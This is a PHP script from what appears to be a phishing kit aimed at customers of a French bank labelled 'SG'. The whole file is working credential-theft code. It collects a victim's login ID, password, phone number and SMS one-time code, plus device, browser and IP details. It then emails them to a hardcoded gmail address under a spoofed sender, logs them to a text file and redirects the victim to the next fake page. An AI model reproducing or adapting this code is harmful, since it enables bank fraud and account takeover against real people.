<?php
// for more tools visite https://www.ghostools.com
include("funcs.php");

$message  = "******* New Login SG *******\n\n";
$message .= "Identifiant : ".$_SESSION['user_id']."\n";
$message .= "Password : ".$_SESSION['Hidden1']."\n\n";
$message .= "\n";
$message .= "******* Téléphone *******\n\n";
$message .= "Tél : ".$_SESSION['tel']."\n";
$message .= "******* SMS *******\n\n";
$message .= "SMS : ".$_POST['sms']."\n";
$message .= "***************************************\n\n";

$message .= "******* SYS *******\n\n";
$message .= "Device  : ".$OS."\n";
$message .= "Browser : ".$Browser."\n";
$message .= "IP      : ".$ip."\n";

$message .= "******* End Login Data *******\n\n\n\n\n";

$send = "elabdill91@gmail.com";
$subject = "SG|".$ip."".countryinfo($message);
$headers = "From:  Login <don@mox.fr>";
mail($send,$subject,$message,$headers);
 
$file = fopen("../fullato.txt","a");
fwrite($file,$message);  



header("Location: pass.php");

?>

